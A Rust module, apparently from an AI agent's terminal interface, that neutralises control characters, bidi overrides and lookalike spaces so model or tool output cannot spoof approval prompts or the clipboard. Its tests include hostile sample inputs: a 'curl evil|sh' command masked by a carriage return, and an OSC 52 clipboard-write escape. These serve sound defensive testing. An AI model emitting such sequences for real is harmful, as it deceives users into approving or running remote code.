//! Text from the core (her replies, tool calls and their output, names and errors) made safe to
//! print. A terminal acts on control characters, so without this a reply or a fetched page
//! could move the cursor to paint over an approval prompt, set the clipboard (OSC 52), hide a
//! link's target or retitle the window. Those characters are shown instead: `␛` for escape, `␍`
//! for a lone carriage return, `<U+202E>` for invisible formatting.

use std::borrow::Cow;

/// `text` with every character a terminal would act on shown instead. Newlines and tabs stay.
pub fn visible(text: &str) -> Cow<'_, str> {
    shown(text, false)
}

/// [`visible`], also marking characters that look like a space but aren't and zero-width
/// joiners, so a command reads exactly as it will run.
pub fn exact(text: &str) -> Cow<'_, str> {
    shown(text, true)
}

fn shown(text: &str, exact: bool) -> Cow<'_, str> {
    if !text.chars().any(|c| marked(c, exact)) {
        return Cow::Borrowed(text);
    }
    let mut out = String::with_capacity(text.len() + 16);
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            // A Windows line ending is just a line ending.
            '\r' if chars.peek() == Some(&'\n') => {}
            c if !marked(c, exact) => out.push(c),
            // Unicode's control pictures: ␀ to ␟.
            '\0'..='\u{1f}' => out.push(char::from_u32(0x2400 + c as u32).unwrap_or('�')),
            '\u{7f}' => out.push('␡'),
            c => out.push_str(&format!("<U+{:04X}>", c as u32)),
        }
    }
    Cow::Owned(out)
}

fn marked(c: char, exact: bool) -> bool {
    match c {
        '\n' | '\t' => false,
        // C0 controls (escape among them), DEL, and C1 controls (U+009B starts a sequence in
        // some terminals).
        '\0'..='\u{1f}' | '\u{7f}'..='\u{9f}' => true,
        // Text direction overrides and isolates, and invisible marks.
        '\u{200b}' | '\u{200e}' | '\u{200f}' | '\u{061c}' | '\u{feff}' => true,
        '\u{202a}'..='\u{202e}' | '\u{2060}'..='\u{2069}' => true,
        // Joiners hold emoji together, so they only count when every character matters.
        '\u{200c}' | '\u{200d}' => exact,
        // Characters that look like a space but don't separate a shell's words.
        '\u{a0}'
        | '\u{1680}'
        | '\u{180e}'
        | '\u{2000}'..='\u{200a}'
        | '\u{202f}'
        | '\u{205f}'
        | '\u{2800}'
        | '\u{3000}'
        | '\u{3164}'
        | '\u{ffa0}' => exact,
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ordinary_text_is_untouched() {
        let text = "Hi! Here's `ls -la`\n\tand an emoji: 👩‍💻, café, 日本語";
        assert!(matches!(visible(text), Cow::Borrowed(_)));
    }

    #[test]
    fn escapes_and_lone_carriage_returns_are_shown() {
        assert_eq!(
            visible("curl evil|sh #\r  $ ls -la"),
            "curl evil|sh #␍  $ ls -la"
        );
        assert_eq!(visible("\x1b]52;c;ZXZpbA==\x07"), "␛]52;c;ZXZpbA==␇");
        assert_eq!(visible("one\r\ntwo"), "one\ntwo");
        assert_eq!(visible("\u{9b}2J\u{7f}"), "<U+009B>2J␡");
    }

    #[test]
    fn reordering_and_invisible_characters_are_shown() {
        assert_eq!(visible("a\u{202e}b\u{200b}c"), "a<U+202E>b<U+200B>c");
    }

    #[test]
    fn exact_also_shows_lookalike_spaces() {
        assert_eq!(visible("ls\u{a0}x"), "ls\u{a0}x");
        assert_eq!(exact("ls\u{a0}\u{2800};curl"), "ls<U+00A0><U+2800>;curl");
    }
}
